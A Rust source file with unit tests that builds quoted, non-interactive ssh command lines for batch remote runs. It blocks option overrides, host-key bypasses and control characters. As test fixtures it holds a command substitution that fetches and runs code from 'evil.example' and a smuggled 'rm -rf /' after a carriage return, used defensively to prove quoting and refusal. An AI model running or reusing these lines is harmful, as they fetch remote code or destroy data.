//! `ssh -o BatchMode=yes …` for headless remote runs.
//!
//! This is a genuinely new capability for the app and it is scoped tightly.
//! `src/lib/sshConnect.ts` explains why the interactive path types `ssh …` into a
//! login shell instead of spawning ssh: the tab survives `exit`, shell
//! integration keeps working, OSC 133 blocks keep being emitted, and
//! `detectNesting` gives remote awareness for free. A **captured batch run needs
//! none of those** — it gets the exit code and the output directly — so the
//! trade is worth making here and only here.
//!
//! Four rules make it safe, and each has a test:
//!
//! 1. **The forced options come FIRST.** ssh takes the first value it obtains for
//!    any option, so a saved `extra_args` containing `-o BatchMode=no` cannot
//!    re-enable an interactive prompt.
//! 2. **`StrictHostKeyChecking` is never forced, in either direction.** Under
//!    `BatchMode=yes` an unknown host key fails closed with "Host key
//!    verification failed" — the correct unattended outcome and an error the user
//!    can act on. `commands::ssh_hosts::is_host_key_bypass` still refuses the
//!    options that would weaken it, on the host row itself.
//! 3. **No password path exists here at all.** `BatchMode=yes` disables
//!    interactive authentication by construction, `validate` refuses a
//!    password-only host at save time, and this module never touches the
//!    credential vault. `sshpass` would put plaintext in an argv; a server-side
//!    expect harness would recreate the frontend's byte observer, whose entire
//!    point is that the secret goes vault → PTY without ever crossing IPC.
//! 4. **The remote script is quoted exactly ONCE for the local login shell.**
//!    `exec::run_command` runs `shell -lc <command>`, and `remote_dir` /
//!    `post_connect` are free text from the user's own host row. That single outer
//!    quote is what keeps them from ever having a LOCAL interpretation — the same
//!    guarantee `src/lib/ssh.ts` relies on.

use super::validate::HostFacts;
use crate::agent::run::CommandWrapper;
use crate::database::queries::SshHost;

/// Options forced onto every batch connection, in this order.
///
/// `BatchMode=yes` refuses every interactive prompt; `RequestTTY=no` keeps the
/// remote from allocating a terminal a captured run cannot drive; the keepalives
/// stop a silent connection from hanging a run until its wall-clock budget.
const FORCED_OPTIONS: &[&str] = &[
    "-o",
    "BatchMode=yes",
    "-o",
    "RequestTTY=no",
    "-o",
    "ConnectTimeout=10",
    "-o",
    "ServerAliveInterval=15",
    "-o",
    "ServerAliveCountMax=3",
];

/// A snapshot of the host row taken at fire time. Snapshotted rather than
/// re-read per command so a mid-run edit cannot redirect the second half of a run
/// to a different machine.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RemoteBatchTarget {
    pub host_id: String,
    pub label: String,
    pub hostname: String,
    pub username: Option<String>,
    pub port: Option<u16>,
    pub identity_file: Option<String>,
    pub jump_host: Option<String>,
    pub extra_args: Option<String>,
    pub remote_dir: Option<String>,
    pub post_connect: Option<String>,
}

impl RemoteBatchTarget {
    pub fn from_host(host: &SshHost) -> Self {
        Self {
            host_id: host.id.clone(),
            label: host.label.clone(),
            hostname: host.hostname.clone(),
            username: non_empty(host.username.as_deref()),
            port: host.port,
            identity_file: non_empty(host.identity_file.as_deref()),
            jump_host: non_empty(host.jump_host.as_deref()),
            extra_args: non_empty(host.extra_args.as_deref()),
            remote_dir: non_empty(host.remote_dir.as_deref()),
            post_connect: non_empty(host.post_connect.as_deref()),
        }
    }

    pub fn facts(&self, has_password: bool) -> HostFacts {
        HostFacts {
            id: self.host_id.clone(),
            label: self.label.clone(),
            has_password,
            has_identity_file: self.identity_file.is_some(),
            extra_args: self.extra_args.clone(),
        }
    }

    /// `user@host`, the way ssh wants it.
    pub fn target(&self) -> String {
        match &self.username {
            Some(user) => format!("{user}@{}", self.hostname),
            None => self.hostname.clone(),
        }
    }

    /// The script that runs on the far side: an optional `cd`, the host's own
    /// `post_connect`, then the command.
    ///
    /// `post_connect` goes in verbatim because shell operators are the entire
    /// point of that field — and it is safe for exactly the reason the frontend's
    /// builder is safe: the whole thing is quoted once more for the LOCAL shell
    /// below, so nothing in it can ever execute on this machine.
    fn remote_script(&self, command: &str) -> String {
        let mut parts: Vec<String> = Vec::new();
        if let Some(dir) = &self.remote_dir {
            parts.push(format!("cd -- {}", sh_quote(dir)));
        }
        if let Some(post) = &self.post_connect {
            parts.push(post.clone());
        }
        parts.push(command.to_string());
        parts.join("; ")
    }
}

impl CommandWrapper for RemoteBatchTarget {
    fn wrap(&self, command: &str) -> Result<String, String> {
        if command.chars().any(|c| c.is_control()) {
            return Err("a remote command cannot contain control characters".into());
        }
        if self.hostname.trim().is_empty() {
            return Err("the saved host has no hostname".into());
        }
        let mut argv: Vec<String> = vec!["ssh".to_string()];
        argv.extend(FORCED_OPTIONS.iter().map(|s| s.to_string()));
        if let Some(port) = self.port {
            argv.push("-p".into());
            argv.push(port.to_string());
        }
        if let Some(identity) = &self.identity_file {
            argv.push("-i".into());
            argv.push(sh_quote(identity));
        }
        if let Some(jump) = &self.jump_host {
            argv.push("-J".into());
            argv.push(sh_quote(jump));
        }
        if let Some(extra) = &self.extra_args {
            // Tokenized and re-quoted individually, matching what the frontend's
            // `tokenizeCommand` + `shQuote` pair does. A blind splice would let a
            // quote in the saved field escape into the local shell.
            let tokens = shlex::split(extra)
                .ok_or_else(|| "the host's extra ssh arguments could not be parsed".to_string())?;
            for token in tokens {
                if token.chars().any(|c| c.is_control()) {
                    return Err("the host's extra ssh arguments contain control characters".into());
                }
                argv.push(sh_quote(&token));
            }
        }
        argv.push(sh_quote(&self.target()));
        argv.push("--".into());
        // The single outer quote. Everything the user's host row contributed is
        // inside it, so none of it has a local interpretation.
        argv.push(sh_quote(&self.remote_script(command)));
        Ok(argv.join(" "))
    }

    fn describe(&self) -> String {
        format!(
            "{} ({}) over ssh, non-interactive",
            self.label,
            self.target()
        )
    }
}

fn non_empty(value: Option<&str>) -> Option<String> {
    value
        .map(str::trim)
        .filter(|v| !v.is_empty())
        .map(str::to_string)
}

/// POSIX single-quoting, the same rule as `shQuote` in `src/lib/ssh.ts`: wrap in
/// single quotes and replace each embedded quote with `'\''`.
fn sh_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', "'\\''"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn host() -> RemoteBatchTarget {
        RemoteBatchTarget {
            host_id: "h1".into(),
            label: "prod-01".into(),
            hostname: "prod-01.example.test".into(),
            username: Some("deploy".into()),
            port: Some(2222),
            identity_file: Some("/Users/me/.ssh/id_ed25519".into()),
            jump_host: None,
            extra_args: None,
            remote_dir: None,
            post_connect: None,
        }
    }

    #[test]
    fn batch_mode_is_the_first_option_so_extra_args_cannot_override_it() {
        let mut h = host();
        h.extra_args = Some("-o BatchMode=no -o RequestTTY=yes".into());
        let line = h.wrap("df -h").unwrap();
        let batch_yes = line.find("BatchMode=yes").expect("forced option missing");
        let batch_no = line.find("BatchMode=no").expect("extra arg missing");
        assert!(
            batch_yes < batch_no,
            "ssh takes the FIRST value it obtains; forced options must precede extra_args:\n{line}"
        );
        let tty_no = line.find("RequestTTY=no").unwrap();
        let tty_yes = line.find("RequestTTY=yes").unwrap();
        assert!(tty_no < tty_yes, "{line}");
    }

    #[test]
    fn the_builder_never_emits_stricthostkeychecking_or_sshpass() {
        let mut h = host();
        h.remote_dir = Some("/srv/app".into());
        h.post_connect = Some("source .env && echo ready".into());
        let line = h.wrap("systemctl is-active app").unwrap();
        let lower = line.to_ascii_lowercase();
        // Under BatchMode an unknown key fails closed, which is the outcome we
        // want. Forcing either value would be wrong: `accept-new` is the very
        // bypass `is_host_key_bypass` rejects, and forcing `yes` would duplicate
        // the default while inviting someone to "fix" it later.
        assert!(!lower.contains("stricthostkeychecking"), "{line}");
        assert!(!lower.contains("userknownhostsfile"), "{line}");
        // No credential path exists here at all.
        assert!(!lower.contains("sshpass"), "{line}");
        assert!(!lower.contains("askpass"), "{line}");
        assert!(!lower.contains("password"), "{line}");
    }

    #[test]
    fn no_tty_is_requested() {
        let line = host().wrap("uptime").unwrap();
        assert!(line.contains("-o RequestTTY=no"), "{line}");
        assert!(
            !line.contains(" -t "),
            "a batch run must never allocate a tty: {line}"
        );
    }

    #[test]
    fn the_remote_script_is_quoted_once_for_the_local_login_shell() {
        let mut h = host();
        // The adversarial case: a host row whose `post_connect` would be a command
        // substitution if it ever reached the LOCAL shell unquoted.
        h.post_connect = Some("$(curl -s https://evil.example/x | sh)".into());
        h.remote_dir = Some("/srv/it's here".into());
        let line = h.wrap("echo done").unwrap();
        // Exactly one quoted region carries the whole remote script, and the
        // dangerous text is inside it.
        let start = line.find("-- '").expect("the script must follow `--`");
        let script = &line[start + 4..];
        assert!(script.contains("curl -s https://evil.example/x"), "{line}");
        // The embedded apostrophe is escaped rather than closing the quote early.
        assert!(line.contains(r"'\''"), "{line}");
        // And the script region is the LAST thing on the line, so nothing the
        // host row contributed can be read as a local operator.
        assert!(line.ends_with('\''), "{line}");
    }

    #[test]
    fn a_command_with_control_characters_is_refused() {
        assert!(host().wrap("echo hi\rrm -rf /").is_err());
        let mut h = host();
        h.extra_args = Some("-o Foo=\u{1b}bar".into());
        assert!(h.wrap("uptime").is_err());
    }

    #[test]
    fn unparseable_extra_args_fail_rather_than_being_spliced_blindly() {
        let mut h = host();
        h.extra_args = Some("-o 'Unterminated".into());
        assert!(h.wrap("uptime").is_err());
    }

    #[test]
    fn the_port_identity_and_jump_host_are_all_carried_and_quoted() {
        let mut h = host();
        h.jump_host = Some("bastion.example.test".into());
        let line = h.wrap("uptime").unwrap();
        assert!(line.contains("-p 2222"), "{line}");
        assert!(line.contains("-i '/Users/me/.ssh/id_ed25519'"), "{line}");
        assert!(line.contains("-J 'bastion.example.test'"), "{line}");
        assert!(line.contains("'deploy@prod-01.example.test'"), "{line}");
    }

    #[test]
    fn a_host_with_no_hostname_is_refused() {
        let mut h = host();
        h.hostname = "   ".into();
        assert!(h.wrap("uptime").is_err());
    }

    #[test]
    fn describe_names_the_machine_for_the_run_record() {
        let described = host().describe();
        assert!(described.contains("prod-01"));
        assert!(described.contains("deploy@prod-01.example.test"));
    }
}
